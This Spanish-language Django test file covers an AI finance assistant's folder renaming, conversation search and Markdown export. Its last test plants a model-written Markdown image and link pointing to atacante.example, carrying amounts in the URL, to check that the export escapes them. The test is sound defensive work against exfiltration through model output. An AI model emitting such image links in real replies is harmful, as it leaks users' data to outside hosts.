"""Módulo 97, ejercicios: renombrar una carpeta, buscar en las conversaciones y descargar una en Markdown."""

import pytest

from asistente.tests.fakes.llm_fake import LLMFake
from asistente.tests.infrastructure.api.v1.test_api_chat import estructurada, eventos, url
from conftest import MembresiaFactory, UsuarioFactory

pytestmark = [
    pytest.mark.django_db,
    pytest.mark.filterwarnings("ignore:StreamingHttpResponse must consume asynchronous iterators"),
]


def test_renombrar_una_carpeta(casa, cliente):
    ana, hogar = casa
    c = cliente(ana)
    viaje = c.post(url(hogar, "carpetas"), {"nombre": "Viaje"}, format="json").json()
    c.post(url(hogar, "carpetas"), {"nombre": "Casa"}, format="json")

    r = c.patch(url(hogar, "carpetas", viaje["id"]), {"nombre": " Lisboa "}, format="json")
    assert r.status_code == 200 and r.json() == {"id": viaje["id"], "nombre": "Lisboa", "conversaciones": 0}
    assert c.patch(url(hogar, "carpetas", viaje["id"]), {"nombre": "Casa"}, format="json").status_code == 400
    assert c.patch(url(hogar, "carpetas", viaje["id"]), {"nombre": ""}, format="json").status_code == 400

    luis = UsuarioFactory()
    MembresiaFactory(usuario=luis, hogar=hogar)
    assert cliente(luis).patch(url(hogar, "carpetas", viaje["id"]), {"nombre": "Mía"}, format="json").status_code == 404


def test_buscar_en_el_titulo_y_en_los_mensajes_sin_tildes(casa, cliente, llm):
    ana, hogar = casa
    c = cliente(ana)
    luz = c.post(url(hogar), {}, format="json").json()["conversacion"]["id"]
    c.patch(url(hogar, "conversaciones", luz), {"titulo": "Factura de la luz"}, format="json")
    cafe = c.post(url(hogar), {}, format="json").json()["conversacion"]["id"]
    llm.guion += [LLMFake.responder("En cafés, 42,10 €."), estructurada("En cafés, 42,10 €.")]
    eventos(c.post(url(hogar, "conversaciones", cafe, "preguntar"), {"texto": "¿Y en CAFÉ?"}, format="json"))

    def buscar(q):
        return [x["id"] for x in c.get(url(hogar), {"q": q}).json()]

    assert buscar("LUZ") == [luz]
    assert buscar("cafe") == [cafe]  # en la pregunta y en la respuesta: una vez
    assert buscar("factura cafe") == []
    assert sorted(buscar("  ")) == sorted([luz, cafe])  # vacía: todas


def test_descargar_una_conversacion_en_markdown(casa, cliente, llm):
    ana, hogar = casa
    c = cliente(ana)
    cid = c.post(url(hogar), {}, format="json").json()["conversacion"]["id"]
    llm.guion += [
        LLMFake.llamar("proponer_movimiento", importe="3.50", concepto="Churros", categoria="Ocio"),
        LLMFake.responder("Preparado: confírmalo."),
        estructurada("Preparado: confírmalo."),
    ]
    eventos(c.post(url(hogar, "conversaciones", cid, "preguntar"), {"texto": "Apunta 3,50 de churros"}, format="json"))

    r = c.get(url(hogar, "conversaciones", cid, "markdown"))
    assert r.status_code == 200 and r["Content-Type"] == "text/markdown; charset=utf-8"
    assert r["Content-Disposition"] == f'attachment; filename="conversacion-{cid}.md"'
    assert r.content.decode().startswith(
        "# Gasto de septiembre\n"
        "\n"
        "**Tú**:\n"
        "\n"
        "Apunta 3,50 de churros\n"
        "\n"
        "**Asistente**:\n"
        "\n"
        "Preparado: confírmalo.\n"
        "\n"
        "- Propuesta (pendiente): Gasto de 3,50 €: «Churros», en Ocio, el "
    )
    assert cliente(UsuarioFactory()).get(url(hogar, "conversaciones", cid, "markdown")).status_code in (403, 404)


def test_en_la_descarga_los_titulos_y_las_propuestas_son_texto_no_markdown(casa, cliente, llm):
    """El título de un gráfico y el concepto de una propuesta los escribe el modelo: en el archivo, se leen tal cual
    (ni una imagen que el visor descargue sola ni un enlace)."""
    from markdown_it import MarkdownIt

    ana, hogar = casa
    c = cliente(ana)
    cid = c.post(url(hogar), {}, format="json").json()["conversacion"]["id"]
    imagen = "![](https://atacante.example/p.png?d=776,59)"
    llm.guion += [
        LLMFake.llamar("grafico", tipo="barras", titulo=imagen, fuente="tendencia", argumentos={"meses": 2}),
        LLMFake.llamar("proponer_movimiento", importe="1.00", concepto=f"[Churros]({imagen[4:-1]})"),
        LLMFake.responder("Hecho."),
        estructurada("Hecho."),
    ]
    eventos(c.post(url(hogar, "conversaciones", cid, "preguntar"), {"texto": "Dibuja y apunta"}, format="json"))

    md = c.get(url(hogar, "conversaciones", cid, "markdown")).content.decode()
    assert "- Gráfico: \\!\\[\\](https://atacante.example/p.png?d=776,59)" in md
    html = MarkdownIt("commonmark").render(md)
    assert "<img" not in html and "<a " not in html
